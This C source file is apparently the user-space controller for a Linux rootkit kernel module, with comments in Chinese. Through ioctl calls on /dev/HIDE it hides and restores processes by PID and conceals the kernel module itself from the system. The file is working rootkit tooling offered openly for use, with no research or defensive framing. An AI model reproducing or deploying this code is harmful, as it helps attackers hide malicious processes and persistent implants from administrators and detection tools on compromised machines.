#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>

// 与内核模块定义一致的操作命令（必须保持数值同步）
#define OP_HIDE_PID 0x800
#define OP_RED_PID 0x801
#define OP_HIDE_MOD 0x8002
#define OP_RED_MOD 0x8003

// 设备文件路径（与内核模块DEVICE_NAME对应）
#define DEVICE_PATH "/dev/HIDE"

// 功能函数声明
static int hide_pid(int fd, pid_t pid);
static int restore_pid(int fd, pid_t pid);
static int hide_self_module(int fd);
static int restore_self_module(int fd);
static void print_usage(const char *prog_name);

int main(int argc, char *argv[])
{
    int fd;
    int ret = 0;

    // 检查命令行参数
    if (argc < 2)
    {
        print_usage(argv[0]);
        return EXIT_FAILURE;
    }

    // 打开设备文件（需要root权限）
    fd = open(DEVICE_PATH, O_RDWR);
    if (fd < 0)
    {
        fprintf(stderr, "Failed to open device %s: %s\n",
                DEVICE_PATH, strerror(errno));
        fprintf(stderr, "Ensure the kernel module is loaded and device exists\n");
        return EXIT_FAILURE;
    }

    // 解析命令并执行
    if (strcmp(argv[1], "hide_pid") == 0)
    {
        if (argc != 3)
        {
            fprintf(stderr, "Usage: %s hide_pid <pid>\n", argv[0]);
            ret = EXIT_FAILURE;
        }
        else
        {
            pid_t pid = atoi(argv[2]);
            ret = hide_pid(fd, pid);
        }
    }
    else if (strcmp(argv[1], "restore_pid") == 0)
    {
        if (argc != 3)
        {
            fprintf(stderr, "Usage: %s restore_pid <pid>\n", argv[0]);
            ret = EXIT_FAILURE;
        }
        else
        {
            pid_t pid = atoi(argv[2]);
            ret = restore_pid(fd, pid);
        }
    }
    else if (strcmp(argv[1], "hide_self") == 0)
    {
        ret = hide_self_module(fd);
    }
    else if (strcmp(argv[1], "restore_self") == 0)
    {
        ret = restore_self_module(fd);
    }
    else
    {
        fprintf(stderr, "Unknown command: %s\n", argv[1]);
        print_usage(argv[0]);
        ret = EXIT_FAILURE;
    }

    // 关闭设备
    close(fd);
    return ret;
}

// 隐藏指定PID
static int hide_pid(int fd, pid_t pid)
{
    int ret = ioctl(fd, OP_HIDE_PID, (unsigned long)pid);
    if (ret < 0)
    {
        fprintf(stderr, "Failed to hide PID %d: %s\n", pid, strerror(errno));
        return EXIT_FAILURE;
    }
    printf("Successfully hidden PID: %d\n", pid);
    return EXIT_SUCCESS;
}

// 恢复指定PID
static int restore_pid(int fd, pid_t pid)
{
    int ret = ioctl(fd, OP_RED_PID, (unsigned long)pid);
    if (ret < 0)
    {
        fprintf(stderr, "Failed to restore PID %d: %s\n", pid, strerror(errno));
        return EXIT_FAILURE;
    }
    printf("Successfully restored PID: %d\n", pid);
    return EXIT_SUCCESS;
}

// 隐藏内核模块自身
static int hide_self_module(int fd)
{
    int ret = ioctl(fd, OP_HIDE_MOD);
    if (ret < 0)
    {
        fprintf(stderr, "Failed to hide self module: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }
    printf("Successfully hidden self module\n");
    return EXIT_SUCCESS;
}

// 恢复内核模块自身
static int restore_self_module(int fd)
{
    int ret = ioctl(fd, OP_RED_MOD);
    if (ret < 0)
    {
        fprintf(stderr, "Failed to restore self module: %s\n", strerror(errno));
        return EXIT_FAILURE;
    }
    printf("Successfully restored self module\n");
    return EXIT_SUCCESS;
}

// 打印使用帮助
static void print_usage(const char *prog_name)
{
    printf("Usage:\n");
    printf("  %s hide_pid <pid>          - Hide a process by PID\n", prog_name);
    printf("  %s restore_pid <pid>       - Restore a hidden process by PID\n", prog_name);
    printf("  %s hide_self               - Hide the kernel module itself\n", prog_name);
    printf("  %s restore_self            - Restore the kernel module itself\n", prog_name);
}